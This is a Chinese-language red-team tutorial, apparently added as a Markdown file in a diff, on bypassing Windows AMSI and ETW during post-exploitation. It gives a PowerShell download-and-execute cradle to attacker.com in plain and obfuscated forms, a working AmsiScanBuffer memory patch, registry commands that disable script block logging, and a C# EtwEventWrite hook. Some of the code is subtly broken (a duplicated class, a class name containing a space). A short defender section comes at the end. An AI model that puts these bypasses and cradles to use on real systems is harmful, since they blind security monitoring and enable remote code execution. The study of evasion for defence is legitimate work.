@@ -1,0 +1,240 @@
+## 1. 概述 (Overview)
+
+本文档旨在深入探讨在现代 Windows 环境下，针对两大核心安全防御机制——**AMSI (Anti-Malware Scan Interface)** 和 **ETW (Event Tracing for Windows)** 的高级绕过技术。在后渗透（Post-Exploitation）阶段，攻击者通常需要执行各类脚本（如 PowerShell）与 C2 (Command & Control) 服务器通信、横向移动或窃取凭据。AMSI 和 ETW 正是防御此类行为的关键屏障。
+
+- **AMSI** 扮演着“主动防御者”的角色，它为杀毒软件提供了一个接口，使其能够扫描内存、脚本内容和命令行参数，从而在恶意代码执行前进行拦截。
+- **ETW** 则像一个“全景记录仪”，它详细记录了系统和应用程序的底层行为，为安全分析师和蓝队提供了攻击溯源的关键日志。
+
+理解并绕过这两种机制，是现代红队和免杀技术研究的核心议题。本笔记将从技术原理出发，结合实战代码示例，系统性地剖析从基础到进阶的绕过策略。
+
+## 2. 技术原理 (Technical Principles)
+
+### 2.1 AMSI 技术剖析
+
+AMSI (Anti-Malware Scan Interface) 是微软引入的一项安全功能，旨在解决传统基于文件的恶意软件检测方法的局限性。它允许应用程序（如 PowerShell、WScript、VBA）将其内容（如脚本代码、命令）在执行前发送给已注册的反恶意软件产品进行扫描。
+
+**AMSI 的核心拦截逻辑：**
+
+- **拦截内容**：它主要关注内存中的数据流，特别是：
+    - **恶意字符串特征**：如 `Invoke-Mimikatz`, `DownloadString`, `IEX` 等高危函数或命令。
+    - **恶意行为模式**：如内存注入、凭据转储（Dump Credentials）、无文件下载执行等操作的典型代码片段。
+- **拦截范围**：覆盖了几乎所有现代 Windows 脚本引擎，包括：
+    - PowerShell (v3.0+)
+    - Windows Script Host (VBScript, JScript)
+    - Office VBA 宏
+    - .NET 程序集加载
+
+其工作流程可简化为：`脚本引擎准备执行代码` → `调用 AMSI 接口` → `AMSI 将代码/内存缓冲区发送给 AV/EDR` → `AV/EDR 分析并返回扫描结果` → `若为恶意，脚本引擎终止执行`。
+
+### 2.2 ETW 技术剖析
+
+ETW (Event Tracing for Windows) 是一个内核级的、高性能的日志记录系统。它并非一个主动防御工具，而是一个被动的、详细的行为记录器。对于安全而言，ETW 提供了对系统活动的深度可见性，尤其是对 PowerShell 等脚本的执行过程。
+
+**ETW 的核心记录逻辑：**
+
+- **记录内容**：
+    - **脚本执行详情**：记录完整的脚本块内容（ScriptBlock Logging），这与 AMSI 扫描的内容高度重合。
+    - **系统与进程行为**：记录进程创建、网络连接、API 调用等底层活动，为检测恶意行为链提供了“蛛丝马迹”。
+    - **安全关联事件**：ETW 事件可以与 AMSI 的检测结果联动，形成更丰富的安全告警。
+- **工作机制**：ETW 基于发布者-订阅者模型。系统组件或应用程序（发布者）产生事件，而日志服务（订阅者）通过跟踪会话（Trace Session）来收集这些事件，并将其写入日志文件或实时传送给监控工具（如 EDR）。
+
+对于攻击者而言，ETW 的存在意味着即使 AMSI 被绕过，其执行的每一个命令和脚本块仍可能被完整记录下来，从而导致攻击行为暴露。
+
+## 3. 环境准备 (Environment Setup)
+
+进行相关技术验证需要一个基本的攻防环境。
+
+- **攻击机 (Attacker)**：
+    - Kali Linux 或其他装有 Metasploit Framework / Cobalt Strike 的系统。
+    - 用于生成 Payload 和监听 C2 连接。
+- **靶机 (Victim)**：
+    - Windows 10 / Windows Server 2016 或更高版本。
+    - 确保 Windows Defender 或其他 AV/EDR 处于开启状态，以便验证绕过效果。
+    - 安装 Sysinternals Suite 工具包，特别是 `procexp.exe` (Process Explorer) 用于查看 DLL 加载情况。
+
+## 4. 实战示例 (Practical Examples)
+
+### 4.1 AMSI 绕过实战
+
+#### 基础绕过：字符串混淆与编码
+
+这是最简单直接的方法，通过改变恶意字符串的形态来规避基于签名的检测。
+
+**示例：拆分与拼接**
+原始的恶意命令通常会被直接拦截。
+
+```powershell
+# 以下命令会被 AMSI 拦截
+IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+```
+
+通过拆分和拼接字符串，可以绕过简单的静态特征匹配。
+
+```powershell
+# 绕过示例
+$a = 'Down'; $b = 'load'; $c = 'String';
+$method = $a + $b + $c;
+$webclient = New-Object System.Net.WebClient;
+IEX ($webclient.$method('http://attacker.com/payload.ps1'));
+```
+
+#### 进阶绕过：内存补丁 (Memory Patching)
+
+此方法直接攻击 AMSI 的核心逻辑。`amsi.dll` 中的 `AmsiScanBuffer` 或 `AmsiScanString` 函数是执行扫描的关键。通过在内存中修改这个函数的代码，强制其直接返回一个“无恶意”的结果（`AMSI_RESULT_CLEAN`），从而使整个 AMSI 功能失效。
+
+**示例：PowerShell 实现内存补丁**
+以下代码片段通过反射和 P/Invoke 在内存中定位 `AmsiScanBuffer` 函数并对其进行修补，使其直接返回 `0x80070057`（一个表示参数无效的错误码，同样能达到绕过目的）。
+
+```powershell
+# 此代码块演示了通过内存补丁禁用当前 PowerShell 进程的 AMSI
+$Kernel32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Kernel32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $Kernel32
+
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+# 加载 amsi.dll 并获取 AmsiScanBuffer 函数地址
+$hAmsi = [Win32]::LoadLibrary("amsi.dll")
+$pAmsiScanBuffer = [Win32]::GetProcAddress($hAmsi, "AmsiScanBuffer")
+
+# 修改内存保护属性为可读可写可执行
+$p = 0
+[Win32]::VirtualProtect($pAmsiScanBuffer, [UIntPtr]4, 0x40, [ref]$p)
+
+# 写入补丁代码 (ret 指令，强制函数返回)
+# C# 版本: byte[] patch = { 0x31, 0xc0, 0xc3 }; // xor eax, eax; ret
+# PowerShell 中更直接的写法是写入返回特定值的指令
+$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) # mov eax, 0x80070057; ret
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $pAmsiScanBuffer, 6)
+
+Write-Host "AMSI Patched in current process."
+# 在此之后，当前进程中执行的任何命令都不会再被 AMSI 扫描
+```
+
+### 4.2 ETW 绕过实战
+
+#### 基础绕过：修改注册表禁用日志
+
+通过修改注册表可以禁用 PowerShell 的脚本块日志（ScriptBlock Logging），但这需要管理员权限，且容易被检测到。
+
+```powershell
+# 需要管理员权限
+# 禁用 PowerShell 脚本块日志记录
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force
+# 禁用模块日志记录
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Force
+```
+
+#### 进阶绕过：Hook ETW 核心 API
+
+与 AMSI 内存补丁类似，可以通过 Hook `ntdll.dll` 中的 `EtwEventWrite` 函数来阻止事件写入。当任何程序调用 `EtwEventWrite` 尝试记录日志时，我们的 Hook 会拦截该调用，使其直接返回成功而不执行任何操作，从而从根源上“致盲”ETW。
+
+**示例：C# 实现 `EtwEventWrite` Hook (原理示意)**
+这是一个更底层的操作，通常通过 C# 或 C++ 注入到目标进程（如 `powershell.exe`）中执行。
+
+```csharp
+// 这段 C# 代码展示了 Hook EtwEventWrite 的核心逻辑
+// 需要使用 EasyHook 或类似的库来简化 Hook 过程
+
+using System;
+using System.Runtime.InteropServices;
+using EasyHook;
+
+public class Etw Bypass
+{
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern int EtwEventWrite(
+        long regHandle,
+        ref EventDescriptor eventDescriptor,
+        int userDataCount,
+        IntPtr userData
+    );
+
+    // 定义一个委托来匹配原始函数的签名
+    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+    delegate int EtwEventWriteDelegate(
+        long regHandle,
+        ref EventDescriptor eventDescriptor,
+        int userDataCount,
+        IntPtr userData
+    );
+
+    // 我们的Hook函数，它什么都不做，直接返回0 (成功)
+    static int EtwEventWrite_Hooked(
+        long regHandle,
+        ref EventDescriptor eventDescriptor,
+        int userDataCount,
+        IntPtr userData
+    )
+    {
+        // 直接返回，不调用原始函数
+        return 0; 
+    }
+
+    public static void Main()
+    {
+        // 1. 在目标进程中创建 Hook
+        var hook = LocalHook.Create(
+            LocalHook.GetProcAddress("ntdll.dll", "EtwEventWrite"),
+            new EtwEventWriteDelegate(EtwEventWrite_Hooked),
+            null
+        );
+
+        // 2. 激活 Hook (只对当前线程或所有线程)
+        hook.ThreadACL.SetExclusiveACL(new int[] { 0 });
+
+        Console.WriteLine("EtwEventWrite has been hooked. ETW logging is disabled for this process.");
+        
+        // 3. 在这里执行你的恶意 PowerShell 代码...
+        
+        // 4. 卸载 Hook (如果需要)
+        hook.Dispose();
+    }
+}
+```
+
+## 5. 关键细节 (Key Details)
+
+- **AMSI 绕过是进程级的**：内存补丁或反射加载等进阶绕过技术通常只对当前进程有效。如果攻击者在一个 PowerShell 进程中禁用了 AMSI，然后又启动了一个新的 PowerShell 进程，那么新进程的 AMSI 仍然是启用的。
+- **ETW 绕过更底层**：Hook `EtwEventWrite` 同样是进程级的。但由于 `ntdll.dll` 是所有用户模式进程都会加载的核心库，理论上可以将此 Hook 注入到系统中的多个关键进程，从而实现更广泛的日志屏蔽。
+- **权限依赖**：基础的绕过方法（如字符串混淆）不需要高权限。但进阶方法，如修改 HKLM 注册表、跨进程注入 Hook 等，通常需要管理员权限。
+- **检测与对抗**：蓝队可以通过监控 `VirtualProtect` 等敏感 API 的调用来检测内存补丁行为。EDR 产品也开始集成对内存 Hook 的检测能力。因此，红队技术也在不断演进，例如使用硬件断点或更隐蔽的 Hook 技术。
+
+## 6. 安全总结 (Security Summary)
+
+AMSI 和 ETW 是 Windows 生态中非常强大的纵深防御体系。对于红队而言，绕过它们是成功执行后渗透操作的前提；对于蓝队而言，理解其绕过原理则是构建更强健检测规则的基础。
+
+- **防御方建议**：
+    1.  **保持更新**：微软和安全厂商会持续更新 AMSI 的签名和 ETW 的事件源，确保系统和安全产品是最新版本。
+    2.  **强化日志监控**：不要仅依赖默认配置。确保 PowerShell 脚本块日志和模块日志被启用并集中收集。监控可疑的注册表修改行为。
+    3.  **行为分析**：部署先进的 EDR 解决方案。这些工具不仅依赖签名，更能通过分析进程行为链（如 PowerShell -> `VirtualProtect` -> 网络连接）来发现异常，从而检测到内存补丁等高级绕过技术。
+    4.  **限制高权限脚本执行**：通过应用白名单（如 AppLocker）和 PowerShell 约束语言模式（Constrained Language Mode）来限制普通用户执行任意脚本的能力。
+
+- **攻击方趋势**：
+    1.  **自带工具 (Bring Your Own Land)**：攻击者越来越多地使用 C# 或其他语言编写自定义工具，直接通过 P/Invoke 或 D/Invoke 调用 Windows API，完全脱离 PowerShell 等高监控环境。
+    2.  **内核级绕过**：更高级的攻击者可能会尝试在内核层面上禁用 ETW 或其他安全机制，这更加难以检测。
+    3.  **动态规避**：实时检测 EDR 的 Hook 点并进行反制或绕行，免杀技术正朝着更加动态化和智能化的方向发展。
+
+最终，攻防双方的博弈是持续升级的。深入理解底层技术原理，是在这场博弈中保持优势的关键。
